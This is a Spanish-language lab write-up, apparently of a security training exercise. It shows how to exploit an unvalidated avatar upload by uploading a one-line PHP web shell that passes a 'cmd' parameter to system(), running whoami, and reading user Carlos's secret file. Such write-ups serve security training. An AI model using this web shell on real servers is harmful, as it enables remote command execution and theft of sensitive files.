En esta clase trabajamos con una funcionalidad vulnerable de subida de imágenes que no realiza ninguna validación sobre el tipo de archivo recibido. Aprovechamos esta debilidad para subir una shell web en PHP, simulando una imagen, y posteriormente accedemos a ella desde el navegador para ejecutar código en el servidor.

Esta técnica nos permite leer el contenido de archivos sensibles, en este caso extrayendo el secreto del usuario Carlos. Aprenderás a identificar el punto de entrada, crear el payload y validar que se ejecuta correctamente desde el navegador o Burp Suite.

Solucion
La web:
![Pasted_image_20250830195408.png](/Imagenes/Pasted_image_20250830195408.png)
Nos logeamos y vemos que podemos subir un avatar
![Pasted_image_20250830195448.png](/Imagenes/Pasted_image_20250830195448.png)
y bueno podemos crear un payload sencillo para ver si nos permite tener manejo del servidor
cmd.php
(<?php
    system($_GET['cmd']); 
?>)
![Pasted_image_20250830200105.png](/Imagenes/Pasted_image_20250830200105.png)
lo cargamos
![Pasted_image_20250830200129.png](/Imagenes/Pasted_image_20250830200129.png)
nos sale esto
![Pasted_image_20250830200204.png](/Imagenes/Pasted_image_20250830200204.png)
si nosotros le picamos y inspeccionamos la imagen nos dara la ruta donde se almacena
![Pasted_image_20250830200307.png](/Imagenes/Pasted_image_20250830200307.png)
si nos vamos a esa direccion no vamos a ver nada
![Pasted_image_20250830200421.png](/Imagenes/Pasted_image_20250830200421.png)
tal que si ahora le concatenamos ?cmd=whoami
![Pasted_image_20250830200503.png](/Imagenes/Pasted_image_20250830200503.png)
y ya solo ponemos la ruta que nos piden
![Pasted_image_20250830200749.png](/Imagenes/Pasted_image_20250830200749.png)
ya solo proporcionamo el codigo en la pagina
![Pasted_image_20250830200919.png](/Imagenes/Pasted_image_20250830200919.png)
